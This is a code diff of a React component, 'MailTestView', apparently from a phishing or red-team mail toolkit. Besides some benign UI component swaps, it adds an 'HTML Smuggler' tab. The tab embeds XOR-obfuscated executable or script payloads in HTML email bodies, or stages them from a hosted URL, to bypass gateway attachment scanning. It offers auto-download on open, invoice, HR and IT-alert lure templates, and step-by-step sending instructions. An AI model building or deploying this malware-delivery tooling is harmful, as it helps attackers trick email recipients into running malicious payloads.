-                        className="w-full rounded-md border border-border bg-background px-3 py-2 text-sm"
+                        className="h-8 text-sm"
                       />
                     </div>
 
                     <div className="flex items-center justify-between">
-                      <label className="text-sm font-medium">Track Opens</label>
-                      <input
-                        type="checkbox"
-                        checked={trackOpens}
-                        onChange={(e) => setTrackOpens(e.target.checked)}
-                        className="accent-primary"
-                      />
+                      <Label className="text-sm font-medium">Track Opens</Label>
+                      <Switch checked={trackOpens} onCheckedChange={setTrackOpens} />
                     </div>
 
                     <div className="flex items-center justify-between">
-                      <label className="text-sm font-medium">Track Clicks</label>
-                      <input
-                        type="checkbox"
-                        checked={trackClicks}
-                        onChange={(e) => setTrackClicks(e.target.checked)}
-                        className="accent-primary"
-                      />
+                      <Label className="text-sm font-medium">Track Clicks</Label>
+                      <Switch checked={trackClicks} onCheckedChange={setTrackClicks} />
                     </div>
                   </>
                 )}
 
                 <div className="space-y-1">
-                  <label className="text-xs font-medium text-muted-foreground">Campaign</label>
-                  <select
-                    value={campaignId}
-                    onChange={(e) => setCampaignId(e.target.value)}
-                    className="w-full rounded-md border border-border bg-background px-3 py-2 text-sm"
+                  <Label className="text-xs">Campaign</Label>
+                  <Select
+                    value={campaignId || "__none__"}
+                    onValueChange={(val) => setCampaignId(val === "__none__" || val === null ? "" : val)}
                   >
-                    <option value="">No Campaign</option>
-                    {campaigns.map((c) => (
-                      <option key={c.id} value={c.id}>
-                        {c.name} ({c.status})
-                      </option>
-                    ))}
-                  </select>
+                    <SelectTrigger className="h-8 text-sm">
+                      <SelectValue placeholder="No Campaign" />
+                    </SelectTrigger>
+                    <SelectContent>
+                      <SelectItem value="__none__">No Campaign</SelectItem>
+                      {campaigns.map((c) => (
+                        <SelectItem key={c.id} value={c.id}>
+                          {c.name} ({c.status})
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
                 </div>
               </CardContent>
             </Card>
@@ -2202,6 +2145,303 @@ export function MailTestView() {
               )}
             </CardContent>
           </Card>
+        </TabsContent>
+
+        {/* ================================================================ */}
+        {/*  SMUGGLER TAB                                                    */}
+        {/* ================================================================ */}
+        <TabsContent value="smuggler" className="space-y-6">
+          <div className="grid gap-6 xl:grid-cols-2">
+            {/* Config panel */}
+            <Card>
+              <CardHeader className="pb-3">
+                <CardTitle className="text-sm">HTML Smuggler</CardTitle>
+                <CardDescription className="text-xs">
+                  Embed or stage a payload inside an HTML email body — payload reconstructed client-side, bypasses gateway attachment scanning.
+                </CardDescription>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                {/* Mode */}
+                <div>
+                  <label className="block text-xs font-medium mb-1">Mode</label>
+                  <div className="flex gap-2">
+                    {(["embed", "staged", "pretext-only"] as const).map((m) => (
+                      <button
+                        key={m}
+                        onClick={() => setSmugMode(m)}
+                        className={cn(
+                          "flex-1 rounded-md border px-3 py-2 text-xs font-medium transition-colors",
+                          smugMode === m
+                            ? "border-primary bg-primary/10 text-primary"
+                            : "border-border hover:border-primary/50",
+                        )}
+                      >
+                        {m === "embed" ? "Embed" : m === "staged" ? "Staged Pull" : "Pretext Only"}
+                      </button>
+                    ))}
+                  </div>
+                  <p className="mt-1.5 text-xs text-muted-foreground">
+                    {smugMode === "embed" && "Payload base64 is XOR-encoded and reconstructed via JS in the email client."}
+                    {smugMode === "staged" && "Email fetches payload from URL on open/click — payload never touches the email."}
+                    {smugMode === "pretext-only" && "Returns only the decoy HTML body without any payload attachment."}
+                  </p>
+                </div>
+
+                {/* Payload input */}
+                {smugMode === "embed" && (
+                  <div className="space-y-2">
+                    <label className="block text-xs font-medium">Payload File *</label>
+                    {/* Drop zone */}
+                    <label
+                      className={cn(
+                        "flex cursor-pointer flex-col items-center justify-center gap-1.5 rounded-md border-2 border-dashed px-4 py-5 transition-colors",
+                        smugPayloadB64
+                          ? "border-primary/40 bg-primary/5"
+                          : "border-border hover:border-primary/50 hover:bg-muted/30",
+                      )}
+                    >
+                      <input
+                        type="file"
+                        className="sr-only"
+                        onChange={(e) => {
+                          const file = e.target.files?.[0]
+                          if (!file) return
+                          const reader = new FileReader()
+                          reader.onload = () => {
+                            const b64 = btoa(
+                              new Uint8Array(reader.result as ArrayBuffer)
+                                .reduce((s, b) => s + String.fromCharCode(b), ""),
+                            )
+                            setSmugPayloadB64(b64)
+                            if (!smugFilename || smugFilename === "invoice.pdf") {
+                              setSmugFilename(file.name)
+                            }
+                            toast.success(`Loaded ${file.name}`, {
+                              description: `${(file.size / 1024).toFixed(1)} KB → base64 encoded`,
+                            })
+                          }
+                          reader.readAsArrayBuffer(file)
+                          e.target.value = ""
+                        }}
+                      />
+                      {smugPayloadB64 ? (
+                        <>
+                          <span className="text-xs font-medium text-primary">✓ Payload loaded</span>
+                          <span className="text-xs text-muted-foreground">{Math.ceil(smugPayloadB64.length * 0.75 / 1024)} KB raw · {(smugPayloadB64.length / 1024).toFixed(1)} KB base64</span>
+                          <button
+                            type="button"
+                            onClick={(e) => { e.preventDefault(); setSmugPayloadB64("") }}
+                            className="mt-1 text-xs text-destructive hover:underline"
+                          >
+                            Clear
+                          </button>
+                        </>
+                      ) : (
+                        <>
+                          <span className="text-xs font-medium">Drop file here or click to browse</span>
+                          <span className="text-xs text-muted-foreground">.ps1 · .exe · .bin · .py · any file</span>
+                          <span className="text-xs text-muted-foreground">Auto base64-encoded in browser — never uploaded to server until you click Generate</span>
+                        </>
+                      )}
+                    </label>
+                  </div>
+                )}
+
+                {smugMode === "staged" && (
+                  <div>
+                    <Label className="text-xs font-medium mb-1 block">Payload URL *</Label>
+                    <Input
+                      value={smugPayloadUrl}
+                      onChange={(e) => setSmugPayloadUrl(e.target.value)}
+                      className="h-7 text-xs"
+                      placeholder="https://your-node.example.com/payload.ps1"
+                    />
+                    <p className="mt-1 text-xs text-muted-foreground">
+                      Host your payload on a node — the email fetches it on open/click.
+                    </p>
+                  </div>
+                )}
+
+                {/* Filename */}
+                {smugMode !== "pretext-only" && (
+                  <div>
+                    <Label className="text-xs font-medium mb-1 block">Filename</Label>
+                    <Input
+                      value={smugFilename}
+                      onChange={(e) => setSmugFilename(e.target.value)}
+                      className="h-7 text-xs"
+                      placeholder="invoice.pdf"
+                    />
+                  </div>
+                )}
+
+                {/* Pretext */}
+                <div>
+                  <Label className="text-xs font-medium mb-1 block">Pretext Template</Label>
+                  <Select
+                    value={smugPretext || "__none__"}
+                    onValueChange={(val) => setSmugPretext(val === "__none__" || val === null ? "" : val as any)}
+                  >
+                    <SelectTrigger className="h-7 text-xs">
+                      <SelectValue placeholder="— None (use custom decoy HTML) —" />
+                    </SelectTrigger>
+                    <SelectContent>
+                      <SelectItem value="__none__">— None (use custom decoy HTML) —</SelectItem>
+                      <SelectItem value="invoice">Invoice / Billing</SelectItem>
+                      <SelectItem value="hr_policy">HR Policy Update</SelectItem>
+                      <SelectItem value="it_alert">IT Security Alert</SelectItem>
+                      <SelectItem value="contract">Contract Review</SelectItem>
+                    </SelectContent>
+                  </Select>
+                </div>
+
+                {/* Custom decoy HTML override */}
+                {smugMode !== "pretext-only" && (
+                  <div>
+                    <Label className="text-xs font-medium mb-1 block">Custom Decoy HTML <span className="text-muted-foreground">(overrides pretext)</span></Label>
+                    <Textarea
+                      value={smugDecoyHtml}
+                      onChange={(e) => setSmugDecoyHtml(e.target.value)}
+                      rows={3}
+                      className="text-xs font-mono resize-none"
+                      placeholder="<p>Please see attached.</p>"
+                    />
+                  </div>
+                )}
+
+                {/* XOR key (embed only) */}
+                {smugMode === "embed" && (
+                  <div>
+                    <Label className="text-xs font-medium mb-1 block">XOR Obfuscation Key <span className="text-muted-foreground">(1–255, optional)</span></Label>
+                    <Input
+                      value={smugXorKey}
+                      onChange={(e) => setSmugXorKey(e.target.value)}
+                      type="number"
+                      min={1}
+                      max={255}
+                      className="h-7 text-xs"
+                      placeholder="e.g. 42 — hides raw PE/ELF bytes in email source"
+                    />
+                  </div>
+                )}
+
+                {/* Auto-download toggle */}
+                {smugMode !== "pretext-only" && (
+                  <div className="flex items-center justify-between rounded-md border border-border px-3 py-2">
+                    <div>
+                      <p className="text-xs font-medium">Auto-download on open</p>
+                      <p className="text-xs text-muted-foreground">Triggers download immediately on email open (Outlook Desktop, Thunderbird)</p>
+                    </div>
+                    <Switch
+                      checked={smugAutoDownload}
+                      onCheckedChange={setSmugAutoDownload}
+                    />
+                  </div>
+                )}
+
+                {/* Download link text */}
+                {smugMode !== "pretext-only" && !smugAutoDownload && (
+                  <div>
+                    <Label className="text-xs font-medium mb-1 block">Button / Link Text</Label>
+                    <Input
+                      value={smugLinkText}
+                      onChange={(e) => setSmugLinkText(e.target.value)}
+                      className="h-7 text-xs"
+                      placeholder="Download Invoice"
+                    />
+                  </div>
+                )}
+
+                <Button
+                  onClick={generateSmuggled}
+                  disabled={smugLoading}
+                  className="w-full"
+                >
+                  {smugLoading ? "Generating…" : "Generate Smuggled HTML"}
+                </Button>
+              </CardContent>
+            </Card>
+
+            {/* Output panel */}
+            <Card>
+              <CardHeader className="pb-3">
+                <div className="flex items-center justify-between">
+                  <div>
+                    <CardTitle className="text-sm">Generated Output</CardTitle>
+                    <CardDescription className="text-xs">
+                      Use this HTML as the email body — do <strong>not</strong> add payload as an attachment.
+                    </CardDescription>
+                  </div>
+                  {smugResult && (
+                    <div className="flex items-center gap-2">
+                      <Badge variant="outline" className="text-xs tabular-nums">
+                        {(smugResult.sizeBytes / 1024).toFixed(1)} KB
+                      </Badge>
+                      <Badge variant="outline" className="text-xs">
+                        {smugResult.mode ?? smugMode}
+                      </Badge>
+                    </div>
+                  )}
+                </div>
+              </CardHeader>
+              <CardContent className="space-y-3">
+                {!smugResult && (
+                  <div className="flex items-center justify-center rounded-md border border-dashed border-border py-16">
+                    <p className="text-xs text-muted-foreground">Output will appear here after generation.</p>
+                  </div>
+                )}
+                {smugResult && (
+                  <>
+                    <div className="flex gap-2">
+                      <Button
+                        size="sm"
+                        variant="outline"
+                        className="flex-1 text-xs"
+                        onClick={() => {
+                          navigator.clipboard.writeText(smugResult.html)
+                          toast.success("HTML copied to clipboard")
+                        }}
+                      >
+                        Copy HTML
+                      </Button>
+                      <Button
+                        size="sm"
+                        variant="outline"
+                        className="flex-1 text-xs"
+                        onClick={() => {
+                          const blob = new Blob([smugResult.html], { type: "text/html" })
+                          const url = URL.createObjectURL(blob)
+                          const a = document.createElement("a")
+                          a.href = url
+                          a.download = "smuggled-email.html"
+                          a.click()
+                          URL.revokeObjectURL(url)
+                        }}
+                      >
+                        Download .html
+                      </Button>
+                    </div>
+                    <Textarea
+                      readOnly
+                      value={smugResult.html}
+                      rows={20}
+                      className="bg-muted/30 font-mono text-xs resize-none"
+                    />
+                    <div className="rounded-md border border-amber-500/30 bg-amber-500/5 p-3">
+                      <p className="text-xs font-medium text-amber-600 dark:text-amber-400">Usage</p>
+                      <ol className="mt-1 space-y-1 text-xs text-muted-foreground list-decimal list-inside">
+                        <li>Paste this HTML as the <strong>email body</strong> in your mail client or campaign tool.</li>
+                        <li>Do <strong>not</strong> add the payload as a MIME attachment — that defeats the purpose.</li>
+                        <li>Send via the Accounts tab SMTP config or your campaign tool.</li>
+                        {smugMode === "embed" && <li>Payload reconstructs and downloads when the email is opened in Outlook / Thunderbird.</li>}
+                        {smugMode === "staged" && <li>Payload is fetched from <code className="text-xs">{smugPayloadUrl || "your URL"}</code> on click/open — ensure the endpoint is live.</li>}
+                      </ol>
+                    </div>
+                  </>
+                )}
+              </CardContent>
+            </Card>
+          </div>
         </TabsContent>
       </Tabs>
     </div>
